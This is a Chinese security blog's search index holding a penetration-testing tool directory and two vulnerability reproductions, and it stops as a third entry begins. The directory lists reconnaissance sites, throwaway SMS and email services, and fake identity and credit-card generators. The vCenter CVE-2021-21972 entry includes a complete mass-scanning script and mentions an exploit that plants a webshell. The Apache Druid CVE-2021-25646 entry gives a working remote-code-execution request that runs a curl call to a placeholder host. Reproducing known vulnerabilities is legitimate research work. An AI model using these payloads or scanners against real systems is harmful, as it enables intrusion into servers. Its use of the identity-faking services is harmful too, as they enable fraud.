<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>在线工具汇总</title>
      <link href="2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"/>
      <url>2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul><li><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><div class='tip error'><p>信息收集<p></div></h2></li><li><h3 id="信息综合"><a href="#信息综合" class="headerlink" title="信息综合"></a><div class='tip success'><p>信息综合<p></div></h3><h4 id="微步在线"><a href="#微步在线" class="headerlink" title="微步在线"></a><a href="https://x.threatbook.cn/">微步在线</a></h4><h4 id="​RiskIQ"><a href="#​RiskIQ" class="headerlink" title="​RiskIQ"></a><a href="https://community.riskiq.com/home">​RiskIQ</a></h4><h4 id="VirusTotal-线上扫毒"><a href="#VirusTotal-线上扫毒" class="headerlink" title="VirusTotal - 线上扫毒"></a><a href="https://www.virustotal.com/gui/home/url">VirusTotal - 线上扫毒</a></h4></li><li><h3 id="资产测绘搜索"><a href="#资产测绘搜索" class="headerlink" title="资产测绘搜索"></a><div class='tip success'><p>资产测绘搜索<p></div></h3><h4 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google - Hack"></a><a href="https://www.0xll.cc/google_hack.html">Google - Hack</a></h4><h4 id="Google-搜索"><a href="#Google-搜索" class="headerlink" title="Google - 搜索"></a><a href="https://www.google.com/">Google - 搜索</a></h4><h4 id="bing-搜索"><a href="#bing-搜索" class="headerlink" title="bing - 搜索"></a><a href="https://cn.bing.com/">bing - 搜索</a></h4><h4 id="baidu-搜索"><a href="#baidu-搜索" class="headerlink" title="baidu - 搜索"></a><a href="https://www.baidu.com/">baidu - 搜索</a></h4><h4 id="Shodan-网络空间搜索引擎"><a href="#Shodan-网络空间搜索引擎" class="headerlink" title="Shodan - 网络空间搜索引擎"></a><a href="https://www.shodan.io/">Shodan - 网络空间搜索引擎</a></h4><h4 id="Fofa-网络空间安全搜索引擎"><a href="#Fofa-网络空间安全搜索引擎" class="headerlink" title="Fofa - 网络空间安全搜索引擎"></a><a href="https://fofa.so/">Fofa - 网络空间安全搜索引擎</a></h4><h4 id="ZoomEye-钟馗之眼"><a href="#ZoomEye-钟馗之眼" class="headerlink" title="ZoomEye - 钟馗之眼"></a><a href="https://www.zoomeye.org/">ZoomEye - 钟馗之眼</a></h4></li><li><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a><div class='tip success'><p>指纹识别<p></div></h3><h4 id="网站基础信息获取-ThreatScan"><a href="#网站基础信息获取-ThreatScan" class="headerlink" title="网站基础信息获取 - ThreatScan"></a><a href="https://scan.top15.cn/web/">网站基础信息获取 - ThreatScan</a></h4><h4 id="云悉互联网WEB资产在线梳理-在线CMS指纹识别平台"><a href="#云悉互联网WEB资产在线梳理-在线CMS指纹识别平台" class="headerlink" title="云悉互联网WEB资产在线梳理|在线CMS指纹识别平台"></a><a href="http://www.yunsee.cn/">云悉互联网WEB资产在线梳理|在线CMS指纹识别平台</a></h4><h4 id="在线指纹识别-在线cms识别小插件–在线工具"><a href="#在线指纹识别-在线cms识别小插件–在线工具" class="headerlink" title="在线指纹识别,在线cms识别小插件–在线工具"></a><a href="http://whatweb.bugscaner.com/look/">在线指纹识别,在线cms识别小插件–在线工具</a></h4></li><li><h3 id="子域名-解析历史-旁站-c段"><a href="#子域名-解析历史-旁站-c段" class="headerlink" title="子域名/解析历史/旁站/c段/"></a><div class='tip success'><p>子域名/解析历史/旁站/c段/<p></div></h3><h4 id="w-e-b-site-子域名搜索"><a href="#w-e-b-site-子域名搜索" class="headerlink" title="w-e-b.site -子域名搜索"></a><a href="https://w-e-b.site/?act=findomain">w-e-b.site -子域名搜索</a></h4><h4 id="phpinfo-me-子域名在线爆破"><a href="#phpinfo-me-子域名在线爆破" class="headerlink" title="phpinfo.me - 子域名在线爆破"></a><a href="https://phpinfo.me/domain/">phpinfo.me - 子域名在线爆破</a></h4><h4 id="子成君子域名在线爆破"><a href="#子成君子域名在线爆破" class="headerlink" title="子成君子域名在线爆破"></a><a href="http://z.zcjun.com/">子成君子域名在线爆破</a></h4><h4 id="DNSDB-dns解析历史"><a href="#DNSDB-dns解析历史" class="headerlink" title="DNSDB - dns解析历史"></a><a href="https://dnsdb.io/zh-cn/">DNSDB - dns解析历史</a></h4><h4 id="DNSlytics-域名综合信息查询"><a href="#DNSlytics-域名综合信息查询" class="headerlink" title=" DNSlytics - 域名综合信息查询"></a><a href="https://dnslytics.com/"> DNSlytics - 域名综合信息查询</a></h4><h4 id="securitytrails-域名综合信息查询"><a href="#securitytrails-域名综合信息查询" class="headerlink" title="securitytrails - 域名综合信息查询"></a><a href="https://securitytrails.com/">securitytrails - 域名综合信息查询</a></h4><h4 id="google-https证书透明度报告查询-需翻墙"><a href="#google-https证书透明度报告查询-需翻墙" class="headerlink" title="google https证书透明度报告查询 需翻墙"></a><a href="hhttps://transparencyreport.google.com/https/certificates">google https证书透明度报告查询 需翻墙</a></h4><h4 id="DNSdumpster-域名综合信息查询"><a href="#DNSdumpster-域名综合信息查询" class="headerlink" title="DNSdumpster - 域名综合信息查询"></a><a href="https://dnsdumpster.com/">DNSdumpster - 域名综合信息查询</a></h4><h4 id="Netcraft-域名综合信息查询"><a href="#Netcraft-域名综合信息查询" class="headerlink" title="Netcraft - 域名综合信息查询"></a><a href="https://sitereport.netcraft.com/">Netcraft - 域名综合信息查询</a></h4><h4 id="crt-sh-通过证书搜索域名信息"><a href="#crt-sh-通过证书搜索域名信息" class="headerlink" title="crt.sh - 通过证书搜索域名信息"></a><a href="https://crt.sh/">crt.sh - 通过证书搜索域名信息</a></h4><h4 id="ip138-域名ip-ip域名"><a href="#ip138-域名ip-ip域名" class="headerlink" title="ip138 域名ip-ip域名"></a><a href="https://site.ip138.com/">ip138 域名ip-ip域名</a></h4><h4 id="站长之家ip综合查询"><a href="#站长之家ip综合查询" class="headerlink" title="站长之家ip综合查询"></a><a href="http://ip.tool.chinaz.com/">站长之家ip综合查询</a></h4><h4 id="多功能信息搜索"><a href="#多功能信息搜索" class="headerlink" title="多功能信息搜索"></a><a href="https://censys.io/certificates">多功能信息搜索</a></h4><h4 id="域名IP查询-可批量查询"><a href="#域名IP查询-可批量查询" class="headerlink" title="域名IP查询 可批量查询"></a><a href="http://www.link114.cn/ip/">域名IP查询 可批量查询</a></h4><h4 id="CloudFlare-cnd数据库"><a href="#CloudFlare-cnd数据库" class="headerlink" title="CloudFlare cnd数据库"></a><a href="http://www.crimeflare.org:82/cfs.html">CloudFlare cnd数据库</a></h4></li><li><h3 id="whois-在线查询"><a href="#whois-在线查询" class="headerlink" title="whois 在线查询"></a><div class='tip success'><p>whois 在线查询<p></div></h3><h4 id="中国互联网信息中心-whois查询"><a href="#中国互联网信息中心-whois查询" class="headerlink" title="中国互联网信息中心 whois查询"></a><a href="https://whois.cnnic.cn/WelcomeServlet">中国互联网信息中心 whois查询</a></h4><h4 id="中国互联网信息中心-whois查询-2"><a href="#中国互联网信息中心-whois查询-2" class="headerlink" title="中国互联网信息中心 whois查询 2"></a><a href="http://ipwhois.cnnic.net.cn/">中国互联网信息中心 whois查询 2</a></h4><h4 id="爱特-whois查询"><a href="#爱特-whois查询" class="headerlink" title="爱特 whois查询"></a><a href="https://whois.aite.xyz/">爱特 whois查询</a></h4><h4 id="who-is-whois查询"><a href="#who-is-whois查询" class="headerlink" title="who.is whois查询"></a><a href="https://who.is/">who.is whois查询</a></h4><h4 id="domaintools-whois查询"><a href="#domaintools-whois查询" class="headerlink" title="domaintools whois查询"></a><a href="https://whois.domaintools.com/">domaintools whois查询</a></h4></li><li><h3 id="邮箱信息收集"><a href="#邮箱信息收集" class="headerlink" title="邮箱信息收集"></a><div class='tip success'><p>邮箱信息收集<p></div></h3><h4 id="搜邮箱-邮箱信息搜索"><a href="#搜邮箱-邮箱信息搜索" class="headerlink" title="搜邮箱 邮箱信息搜索"></a><a href="https://souyouxiang.com/">搜邮箱 邮箱信息搜索</a></h4><h4 id="微匹-邮箱信息查询"><a href="#微匹-邮箱信息查询" class="headerlink" title="微匹 邮箱信息查询"></a><a href="http://veryvp.com/Official/Index">微匹 邮箱信息查询</a></h4><h4 id="Hunter-邮箱信息搜索系统"><a href="#Hunter-邮箱信息搜索系统" class="headerlink" title="Hunter 邮箱信息搜索系统"></a><a href="https://hunter.io/search/">Hunter 邮箱信息搜索系统</a></h4><h4 id="skymem-邮箱信息搜索系统"><a href="#skymem-邮箱信息搜索系统" class="headerlink" title="skymem 邮箱信息搜索系统"></a><a href="https://www.skymem.info/">skymem 邮箱信息搜索系统</a></h4></li><li><h3 id="在线端口扫描工具"><a href="#在线端口扫描工具" class="headerlink" title="在线端口扫描工具"></a><div class='tip success'><p>在线端口扫描工具<p></div></h3><h4 id="hackertarget-Nmap在线扫描"><a href="#hackertarget-Nmap在线扫描" class="headerlink" title="hackertarget Nmap在线扫描"></a><a href="https://hackertarget.com/nmap-online-port-scanner/">hackertarget Nmap在线扫描</a></h4><h4 id="Nmap在线扫描"><a href="#Nmap在线扫描" class="headerlink" title="Nmap在线扫描"></a><a href="https://nmap.online/">Nmap在线扫描</a></h4><h4 id="w-e-b-site-在线扫描"><a href="#w-e-b-site-在线扫描" class="headerlink" title="w-e-b.site 在线扫描"></a><a href="https://nmap.online/">w-e-b.site 在线扫描</a></h4></li><li><h3 id="小工具"><a href="#小工具" class="headerlink" title="小工具"></a><div class='tip success'><p>小工具<p></div></h3><h4 id="桔子SEO工具-一键提取url"><a href="#桔子SEO工具-一键提取url" class="headerlink" title="桔子SEO工具 一键提取url"></a><a href="https://seo.juziseo.com/tools/domain/">桔子SEO工具 一键提取url</a></h4><h4 id="搜收录网-批量查询网站标题"><a href="#搜收录网-批量查询网站标题" class="headerlink" title="搜收录网 - 批量查询网站标题 "></a><a href="https://seo.juziseo.com/tools/domain/">搜收录网 - 批量查询网站标题 </a></h4></li><li><h2 id="收发验证码服务-匿名邮箱-身份信息生成"><a href="#收发验证码服务-匿名邮箱-身份信息生成" class="headerlink" title="收发验证码服务-匿名邮箱-身份信息生成"></a><div class='tip error'><p>收发验证码服务-匿名邮箱-身份信息生成<p></div></h2></li><li><h3 id="收发验证码服务"><a href="#收发验证码服务" class="headerlink" title="收发验证码服务"></a><div class='tip success'><p>收发验证码服务<p></div></h3><h4 id="zusms-免费在线手机短信验证码"><a href="#zusms-免费在线手机短信验证码" class="headerlink" title="zusms - 免费在线手机短信验证码 "></a><a href="https://www.zusms.com/">zusms - 免费在线手机短信验证码 </a></h4><h4 id="shejiinn-免费在线手机短信验证码"><a href="#shejiinn-免费在线手机短信验证码" class="headerlink" title="shejiinn - 免费在线手机短信验证码"></a><a href="http://www.shejiinn.com/">shejiinn - 免费在线手机短信验证码</a></h4><h4 id="Z-SMS-免费在线手机短信验证码"><a href="#Z-SMS-免费在线手机短信验证码" class="headerlink" title="Z-SMS - 免费在线手机短信验证码"></a><a href="http://www.shejiinn.com/">Z-SMS - 免费在线手机短信验证码</a></h4><h4 id="materialtools-在线短信接收"><a href="#materialtools-在线短信接收" class="headerlink" title="materialtools - 在线短信接收"></a><a href="https://www.materialtools.com/?page=1">materialtools - 在线短信接收</a></h4><h4 id="yunduanxin-在线接收手机短信验证码"><a href="#yunduanxin-在线接收手机短信验证码" class="headerlink" title="yunduanxin - 在线接收手机短信验证码"></a><a href="https://yunduanxin.net/">yunduanxin - 在线接收手机短信验证码</a></h4><h4 id="ReceiveFreeSMS-各国各地区手机在线接收验证码"><a href="#ReceiveFreeSMS-各国各地区手机在线接收验证码" class="headerlink" title="ReceiveFreeSMS - 各国各地区手机在线接收验证码"></a><a href="http://receivefreesms.com/">ReceiveFreeSMS - 各国各地区手机在线接收验证码</a></h4><h4 id="ReceiveFreeSMS-美国加拿大-地区手机接收验证码"><a href="#ReceiveFreeSMS-美国加拿大-地区手机接收验证码" class="headerlink" title="ReceiveFreeSMS - 美国加拿大 地区手机接收验证码"></a><a href="https://receivefreesms.net/">ReceiveFreeSMS - 美国加拿大 地区手机接收验证码</a></h4><h4 id="sellaite-爱沙尼亚-地区手机接收验证码"><a href="#sellaite-爱沙尼亚-地区手机接收验证码" class="headerlink" title="sellaite - 爱沙尼亚 地区手机接收验证码"></a><a href="http://sms.sellaite.com/">sellaite - 爱沙尼亚 地区手机接收验证码</a></h4><h4 id="freephonenum-在线接收短信-支持发送短信！"><a href="#freephonenum-在线接收短信-支持发送短信！" class="headerlink" title="freephonenum - 在线接收短信  |支持发送短信！|"></a><a href="https://ch.freephonenum.com/">freephonenum - 在线接收短信  |支持发送短信！|</a></h4><h4 id="receiveasms-在线接收短信-国外号码"><a href="#receiveasms-在线接收短信-国外号码" class="headerlink" title="receiveasms - 在线接收短信  |国外号码|"></a><a href="https://receiveasms.com/">receiveasms - 在线接收短信  |国外号码|</a></h4><h4 id="receive-sms-在线接收短信-国外号码"><a href="#receive-sms-在线接收短信-国外号码" class="headerlink" title="receive-sms - 在线接收短信  |国外号码|"></a><a href="https://receive-sms.com/">receive-sms - 在线接收短信  |国外号码|</a></h4></li><li><h3 id="临时，匿名邮箱服务"><a href="#临时，匿名邮箱服务" class="headerlink" title="临时，匿名邮箱服务"></a><div class='tip success'><p>临时，匿名邮箱服务<p></div></h3><h4 id="ProtonMail-可完全匿名注册的邮箱"><a href="#ProtonMail-可完全匿名注册的邮箱" class="headerlink" title="ProtonMail |可完全匿名注册的邮箱|"></a><a href="https://protonmail.com/">ProtonMail |可完全匿名注册的邮箱|</a></h4><h4 id="临时邮箱、临时邮、临时电子邮箱、24小时邮箱"><a href="#临时邮箱、临时邮、临时电子邮箱、24小时邮箱" class="headerlink" title="临时邮箱、临时邮、临时电子邮箱、24小时邮箱"></a><a href="http://24mail.chacuo.net/">临时邮箱、临时邮、临时电子邮箱、24小时邮箱</a></h4><h4 id="YOPmail-临时、匿名的免费邮箱地址。"><a href="#YOPmail-临时、匿名的免费邮箱地址。" class="headerlink" title="YOPmail : 临时、匿名的免费邮箱地址。"></a><a href="http://www.yopmail.com/">YOPmail : 临时、匿名的免费邮箱地址。</a></h4><h4 id="临时邮箱-十秒钟内收到邮件"><a href="#临时邮箱-十秒钟内收到邮件" class="headerlink" title="临时邮箱 - 十秒钟内收到邮件"></a><a href="https://www.linshiyouxiang.net">临时邮箱 - 十秒钟内收到邮件</a></h4><h4 id="10分钟邮箱"><a href="#10分钟邮箱" class="headerlink" title="10分钟邮箱"></a><a href="https://10minutemail.net">10分钟邮箱</a></h4><h4 id="moakt临时邮箱"><a href="#moakt临时邮箱" class="headerlink" title="moakt临时邮箱"></a><a href="https://www.moakt.com">moakt临时邮箱</a></h4><h4 id="TEMPmail-临时邮箱"><a href="#TEMPmail-临时邮箱" class="headerlink" title="TEMPmail 临时邮箱"></a><a href="https://temp-mail.org">TEMPmail 临时邮箱</a></h4><h4 id="FAKE-E-MAIL-临时邮箱"><a href="#FAKE-E-MAIL-临时邮箱" class="headerlink" title="FAKE E-MAIL 临时邮箱"></a><a href="http://www.fakemailgenerator.com">FAKE E-MAIL 临时邮箱</a></h4><h4 id="nada-临时邮箱"><a href="#nada-临时邮箱" class="headerlink" title="nada 临时邮箱"></a><a href="https://getnada.com">nada 临时邮箱</a></h4><h4 id="tempmail-临时邮箱"><a href="#tempmail-临时邮箱" class="headerlink" title="tempmail 临时邮箱"></a><a href="https://tempmail.net">tempmail 临时邮箱</a></h4><h4 id="✉-Guerrilla-Mail-临时邮箱"><a href="#✉-Guerrilla-Mail-临时邮箱" class="headerlink" title="✉ Guerrilla Mail 临时邮箱"></a><a href="https://www.guerrillamail.com/">✉ Guerrilla Mail 临时邮箱</a></h4></li><li><h3 id="个人身份信息生成"><a href="#个人身份信息生成" class="headerlink" title="个人身份信息生成"></a><div class='tip success'><p>个人身份信息生成<p></div></h3><h4 id="美国身份证生成，美国人地址信息生成"><a href="#美国身份证生成，美国人地址信息生成" class="headerlink" title="美国身份证生成，美国人地址信息生成"></a><a href="http://shenfendaquan.com/">美国身份证生成，美国人地址信息生成</a></h4><h4 id="美国地址生成，美国人虚构信息生成-世界各国虚拟身份信息、地址、信用卡生成"><a href="#美国地址生成，美国人虚构信息生成-世界各国虚拟身份信息、地址、信用卡生成" class="headerlink" title="美国地址生成，美国人虚构信息生成-世界各国虚拟身份信息、地址、信用卡生成"></a><a href="http://www.haoweichi.com/">美国地址生成，美国人虚构信息生成-世界各国虚拟身份信息、地址、信用卡生成</a></h4><h4 id="Fake-Name-Generator-个人信息生成"><a href="#Fake-Name-Generator-个人信息生成" class="headerlink" title="Fake Name Generator 个人信息生成"></a><a href="https://www.fakenamegenerator.com/">Fake Name Generator 个人信息生成</a></h4></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 在线工具汇总 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 在线工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-21972  Vmware vCenter 任意文件上传</title>
      <link href="2021/02/25/CVE-2021-21972-Vmware-vCenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>2021/02/25/CVE-2021-21972-Vmware-vCenter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h2><p>vCenter Server7.0 &lt; 7.0.U1c</p><p>vCenter Server6.7 &lt; 6.7.U3l</p><p>vCenter Servr6.5 &lt; 6.5 U3n</p><h4 id="自己搭建好测试环境"><a href="#自己搭建好测试环境" class="headerlink" title="自己搭建好测试环境"></a>自己搭建好测试环境</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/pasted-0.webp" alt="image"></p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><pre><code>/ui/vropspluginui/rest/services/uploadova</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/pasted-2.webp" alt="image"></p><h4 id="批量漏洞检测脚本"><a href="#批量漏洞检测脚本" class="headerlink" title="批量漏洞检测脚本"></a>批量漏洞检测脚本</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/pasted-3.webp" alt="image"></p><p>来自  github: <a href="https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC">https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC</a></p><pre><code>#-*- coding:utf-8 -*-banner = &quot;&quot;&quot;        888888ba             dP                             88    `8b            88                            a88aaaa8P&#39; .d8888b. d8888P .d8888b. dP    dP         88   `8b. 88&#39;  `88   88   Y8ooooo. 88    88         88    .88 88.  .88   88         88 88.  .88         88888888P `88888P8   dP   `88888P&#39; `88888P&#39;    ooooooooooooooooooooooooooooooooooooooooooooooooooooo                 @time:2021/02/24 CVE-2021-21972.py                C0de by NebulabdSec - @batsu                   &quot;&quot;&quot;print(banner)import threadpoolimport randomimport requestsimport argparseimport http.clientimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)http.client.HTTPConnection._http_vsn = 10http.client.HTTPConnection._http_vsn_str = &#39;HTTP/1.0&#39;TARGET_URI = &quot;/ui/vropspluginui/rest/services/uploadova&quot;def get_ua():    first_num = random.randint(55, 62)    third_num = random.randint(0, 3200)    fourth_num = random.randint(0, 140)    os_type = [        &#39;(Windows NT 6.1; WOW64)&#39;, &#39;(Windows NT 10.0; WOW64)&#39;, &#39;(X11; Linux x86_64)&#39;,        &#39;(Macintosh; Intel Mac OS X 10_12_6)&#39;    ]    chrome_version = &#39;Chrome/&#123;&#125;.0.&#123;&#125;.&#123;&#125;&#39;.format(first_num, third_num, fourth_num)    ua = &#39; &#39;.join([&#39;Mozilla/5.0&#39;, random.choice(os_type), &#39;AppleWebKit/537.36&#39;,                   &#39;(KHTML, like Gecko)&#39;, chrome_version, &#39;Safari/537.36&#39;]                  )    return uadef CVE_2021_21972(url):    proxies = &#123;&quot;scoks5&quot;: &quot;http://127.0.0.1:1081&quot;&#125;    headers = &#123;        &#39;User-Agent&#39;: get_ua(),        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;    &#125;    targetUrl = url + TARGET_URI    try:        res = requests.get(targetUrl,                            headers=headers,                            timeout=15,                            verify=False,                            proxies=proxies)                            # proxies=&#123;&#39;socks5&#39;: &#39;http://127.0.0.1:1081&#39;&#125;)        # print(len(res.text))        if res.status_code == 405:            print(&quot;[+] URL:&#123;&#125;--------存在CVE-2021-21972漏洞&quot;.format(url))            # print(&quot;[+] Command success result: &quot; + res.text + &quot;\n&quot;)            with open(&quot;存在漏洞地址.txt&quot;, &#39;a&#39;) as fw:                fw.write(url + &#39;\n&#39;)        else:            print(&quot;[-] &quot; + url + &quot; 没有发现CVE-2021-21972漏洞.\n&quot;)    # except Exception as e:    #     print(e)    except:        print(&quot;[-] &quot; + url + &quot; Request ERROR.\n&quot;)def multithreading(filename, pools=5):    works = []    with open(filename, &quot;r&quot;) as f:        for i in f:            func_params = [i.rstrip(&quot;\n&quot;)]            # func_params = [i] + [cmd]            works.append((func_params, None))    pool = threadpool.ThreadPool(pools)    reqs = threadpool.makeRequests(CVE_2021_21972, works)    [pool.putRequest(req) for req in reqs]    pool.wait()def main():    parser = argparse.ArgumentParser()    parser.add_argument(&quot;-u&quot;,                        &quot;--url&quot;,                        help=&quot;Target URL; Example:http://ip:port&quot;)    parser.add_argument(&quot;-f&quot;,                        &quot;--file&quot;,                        help=&quot;Url File; Example:url.txt&quot;)    # parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Commands to be executed; &quot;)    args = parser.parse_args()    url = args.url    # cmd = args.cmd    file_path = args.file    if url != None and file_path ==None:        CVE_2021_21972(url)    elif url == None and file_path != None:        multithreading(file_path, 10)  # 默认15线程if __name__ == &quot;__main__&quot;:    main()</code></pre><h4 id="漏洞利用脚本"><a href="#漏洞利用脚本" class="headerlink" title="漏洞利用脚本"></a>漏洞利用脚本</h4><p>自动利用上传一枚冰蝎3的webshell</p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/pasted-4.webp" alt="image"></p><p>来自 github: <a href="https://github.com/NS-Sp4ce/CVE-2021-21972">https://github.com/NS-Sp4ce/CVE-2021-21972</a></p><h4 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/pasted-6.webp" alt="image"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Apache Druid CVE-2021-25646 </title>
      <link href="2021/02/03/Apache-Druid-CVE-2021-25646-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>2021/02/03/Apache-Druid-CVE-2021-25646-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自行搭建测试环境"><a href="#自行搭建测试环境" class="headerlink" title="自行搭建测试环境"></a>自行搭建测试环境</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338142733.webp" alt="image"></p><h2 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338225038.webp" alt="image"></p><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338397845.webp" alt="image"></p><h3 id="此处路径与文件填下面的值"><a href="#此处路径与文件填下面的值" class="headerlink" title="此处路径与文件填下面的值"></a>此处路径与文件填下面的值</h3><pre><code>quickstart/tutorial/wikiticker-2015-09-12-sampled.json.gz</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338507305.webp" alt="image"></p><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><h5 id="filter-参数"><a href="#filter-参数" class="headerlink" title="filter 参数"></a>filter 参数</h5><pre><code>&#123;&quot;type&quot;:&quot;selector&quot;,&quot;dimension&quot;:&quot;&quot;,&quot;value&quot;:&quot;&quot;&#125;&#125;&#125;</code></pre><h5 id="改成"><a href="#改成" class="headerlink" title="改成"></a>改成</h5><pre><code>&#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;curl xx.xx.xx.xx&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338658025.webp" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338685632.webp" alt="image"></p><h3 id="成功执行命令"><a href="#成功执行命令" class="headerlink" title="成功执行命令"></a>成功执行命令</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338755741.webp" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338778844.webp" alt="image"></p><h2 id="最终poc-为"><a href="#最终poc-为" class="headerlink" title="最终poc 为"></a>最终poc 为</h2><pre><code>POST http://xx.xx.xx.xx/druid/indexer/v1/sampler HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/jsonContent-Length: 1103&#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\&quot;isRobot\&quot;:true,\&quot;channel\&quot;:\&quot;#x\&quot;,\&quot;timestamp\&quot;:\&quot;2020-12-12T12:10:21.040Z\&quot;,\&quot;flags\&quot;:\&quot;x\&quot;,\&quot;isUnpatrolled\&quot;:false,\&quot;page\&quot;:\&quot;1\&quot;,\&quot;diffUrl\&quot;:\&quot;https://xxx.com\&quot;,\&quot;added\&quot;:1,\&quot;comment\&quot;:\&quot;Botskapande Indonesien omdirigering\&quot;,\&quot;commentLength\&quot;:35,\&quot;isNew\&quot;:true,\&quot;isMinor\&quot;:false,\&quot;delta\&quot;:31,\&quot;isAnonymous\&quot;:true,\&quot;user\&quot;:\&quot;Lsjbot\&quot;,\&quot;deltaBucket\&quot;:0,\&quot;deleted\&quot;:0,\&quot;namespace\&quot;:\&quot;Main\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;url xx.xx.xx.xx&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> rce </tag>
            
            <tag> Apache Druid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>锐捷网关RCE </title>
      <link href="2021/02/03/%E9%94%90%E6%8D%B7%E7%BD%91%E5%85%B3RCE/"/>
